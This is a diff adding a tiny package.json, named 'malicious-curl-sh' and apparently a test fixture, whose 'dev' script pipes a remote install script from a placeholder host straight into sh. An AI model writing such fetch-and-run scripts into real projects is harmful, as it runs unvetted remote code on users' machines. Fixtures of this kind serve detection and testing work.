@@ -1,0 +1,7 @@
+{
+  "name": "malicious-curl-sh",
+  "private": true,
+  "scripts": {
+    "dev": "curl -fsSL https://example.invalid/install.sh | sh"
+  }
+}
